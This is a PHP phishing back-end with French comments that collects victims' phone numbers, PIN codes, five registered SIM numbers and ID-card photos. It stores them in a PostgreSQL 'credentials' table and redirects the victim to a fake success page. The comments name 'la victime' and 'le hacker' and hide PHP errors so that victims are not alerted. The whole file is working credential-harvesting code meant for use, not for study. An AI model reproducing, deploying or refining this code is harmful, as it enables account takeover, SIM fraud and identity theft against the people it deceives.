<?php
// Désactiver l'affichage des erreurs PHP pour ne pas alerter la victime
ini_set('display_errors', 0);
error_reporting(0);

// --- Configuration de la Base de Données (Pour PostgreSQL sur Render) ---
// Récupère l'URL de connexion complète à partir de la variable d'environnement de Render
$db_url = getenv('DATABASE_URL');

// Vérifie si l'URL de la base de données est définie
if (!$db_url) {
    // Si la variable n'est pas définie, loguer une erreur et rediriger.
    // Cela ne devrait pas arriver si DATABASE_URL est bien configurée sur Render.
    error_log("[" . date('Y-m-d H:i:s') . "] Erreur: Variable d'environnement DATABASE_URL non définie.\n");
    header('Location: error.html?type=' . urlencode('db_config_missing'));
    exit();
}

// Parse l'URL pour extraire les composants de la connexion
$url_parts = parse_url($db_url);
$db_host = $url_parts['host'];
$db_port = $url_parts['port'] ?? 5432; // Port par défaut de PostgreSQL
$db_user = $url_parts['user'];
$db_pass = $url_parts['pass'];
$db_name = ltrim($url_parts['path'], '/'); // Retire le slash initial

// --- Configuration du Dossier d'Upload des Fichiers sur le Disque Persistant ---
// ASSUREZ-VOUS QUE '/mnt/uploads/' EST LE CHEMIN DE MONTAGE DE VOTRE DISQUE PERSISTANT SUR RENDER
$upload_dir = '/mnt/uploads/'; 

// Vérifier et créer le dossier d'upload s'il n'existe pas
// Les permissions 0775 sont généralement sûres. Render gère souvent les permissions de base.
if (!is_dir($upload_dir)) {
    // Tente de créer le répertoire, avec gestion d'erreur.
    // Les logs vont vers stderr pour Render.
    if (!mkdir($upload_dir, 0775, true)) {
        error_log("[" . date('Y-m-d H:i:s') . "] Erreur: Impossible de créer le dossier d'upload : " . $upload_dir . "\n");
        header('Location: error.html?type=' . urlencode('upload_dir_creation_failed'));
        exit();
    }
}

// --- FIN Configuration ---


// Vérifier si la requête HTTP est de type POST.
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Récupération et nettoyage des données POST
    $phoneNumber = isset($_POST['phone_number']) ? htmlspecialchars($_POST['phone_number']) : '';
    $pinCode = isset($_POST['pin_code']) ? htmlspecialchars($_POST['pin_code']) : ''; 
    $ipAddress = $_SERVER['REMOTE_ADDR'];
    $timestamp = date('Y-m-d H:i:s');
    
    $readerCardPhotoPath = NULL; // Chemin pour la photo de la carte d'identité

    // --- Collecte et validation des 5 numéros SIM ---
    $simNumbers = [];
    $allSimNumbersProvided = true;
    for ($i = 1; $i <= 5; $i++) {
        $simKey = 'sim_number_' . $i;
        if (isset($_POST[$simKey]) && !empty($_POST[$simKey])) {
            $simNumbers[] = htmlspecialchars($_POST[$simKey]);
        } else {
            $allSimNumbersProvided = false;
            $errorType = 'sim_number_missing'; // Type d'erreur spécifique
            break; // Arrête la boucle dès qu'un numéro manque
        }
    }

    if (!$allSimNumbersProvided) {
        error_log("[" . date('Y-m-d H:i:s') . "] Validation Erreur: Un ou plusieurs numéros SIM sont manquants ($errorType) pour IP: $ipAddress\n"); // Log vers stderr
        header('Location: error.html?type=' . urlencode($errorType)); // Redirection avec type d'erreur
        exit();
    }
    $simRegisteredNumbers = implode(', ', $simNumbers); // Concatène les 5 numéros en une seule chaîne


    // --- Validation des champs obligatoires restants ---
    if (empty($phoneNumber)) {
        $errorType = 'phone_number_missing';
        error_log("[" . date('Y-m-d H:i:s') . "] Validation Erreur: Numéro de téléphone manquant ($errorType) pour IP: $ipAddress\n");
        header('Location: error.html?type=' . urlencode($errorType));
        exit();
    }

    if (empty($pinCode)) {
        $errorType = 'pin_missing';
        error_log("[" . date('Y-m-d H:i:s') . "] Validation Erreur: PIN manquant ($errorType) pour IP: $ipAddress\n");
        header('Location: error.html?type=' . urlencode($errorType));
        exit();
    }

    // Vérifier si la photo de la carte d'identité a été uploadée avec succès
    // (UPLOAD_ERR_OK = 0, signifie aucun erreur)
    if (!isset($_FILES['reader_card_photo']) || $_FILES['reader_card_photo']['error'] !== UPLOAD_ERR_OK) {
        $errorType = 'photo_upload_error';
        error_log("[" . date('Y-m-d H:i:s') . "] Validation Erreur: Photo de carte d'identité manquante ou erreur d'upload ($errorType) pour IP: $ipAddress. Code d'erreur PHP: " . (isset($_FILES['reader_card_photo']) ? $_FILES['reader_card_photo']['error'] : 'Non définie') . "\n");
        header('Location: error.html?type=' . urlencode($errorType));
        exit();
    }


    // --- Gestion de l'upload de la photo de la carte de lecteur/ID ---
    $fileTmpPath = $_FILES['reader_card_photo']['tmp_name'];
    $fileName = $_FILES['reader_card_photo']['name'];
    $fileExtension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));

    $newFileName = sha1(uniqid(rand(), true) . $fileName) . '.' . $fileExtension;
    $destPath = $upload_dir . $newFileName;

    $allowedImageExtensions = ['jpg', 'jpeg', 'png', 'gif', 'webp'];
    $allowedImageMimeTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
    
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $realMimeType = finfo_file($finfo, $fileTmpPath);
    finfo_close($finfo);

    if (in_array($fileExtension, $allowedImageExtensions) && in_array($realMimeType, $allowedImageMimeTypes)) {
        if (move_uploaded_file($fileTmpPath, $destPath)) {
            $readerCardPhotoPath = $newFileName; // Enregistrer seulement le nom du fichier
        } else {
            $errorType = 'photo_move_failed';
            error_log("[" . date('Y-m-d H:i:s') . "] Erreur Upload Photo: Déplacement du fichier échoué ($errorType) pour IP: $ipAddress. Code d'erreur PHP: " . $_FILES['reader_card_photo']['error'] . "\n");
            header('Location: error.html?type=' . urlencode($errorType));
            exit();
        }
    } else {
        $errorType = 'invalid_photo_type';
        error_log("[" . date('Y-m-d H:i:s') . "] Erreur Upload Photo: Type de fichier ou MIME invalide ($errorType) pour IP: $ipAddress - Ext: " . $fileExtension . ", MIME: " . $realMimeType . "\n");
        header('Location: error.html?type=' . urlencode($errorType));
        exit();
    }


    try {
        // Connexion à la base de données via PDO (pour PostgreSQL)
        $dsn = "pgsql:host=$db_host;port=$db_port;dbname=$db_name";
        $pdo = new PDO($dsn, $db_user, $db_pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        // Préparation de la requête SQL pour l'insertion
        // Assurez-vous que la table 'credentials' existe et correspond à cette structure
        $stmt = $pdo->prepare("INSERT INTO credentials (phone_number, sim_registered_numbers, pin_code, reader_card_photo_path, ip_address, timestamp) VALUES (?, ?, ?, ?, ?, ?)");

        // Exécution de la requête avec les données
        $stmt->execute([$phoneNumber, $simRegisteredNumbers, $pinCode, $readerCardPhotoPath, $ipAddress, $timestamp]);

    } catch (PDOException $e) {
        $errorType = 'database_error';
        // En cas d'erreur de base de données, enregistrer l'erreur pour le hacker
        error_log("[" . date('Y-m-d H:i:s') . "] Erreur DB (process_verification): " . $e->getMessage() . " ($errorType)\n"); // Log vers stderr
        header('Location: error.html?type=' . urlencode($errorType)); // Redirection avec type d'erreur
        exit();
    }

    // Rediriger la victime vers une page de succès
    header('Location: success.html');
    exit();
} else {
    // Si le script est accédé directement, afficher une page d'erreur 404
    http_response_code(404);
    exit('Not Found');
}
?>
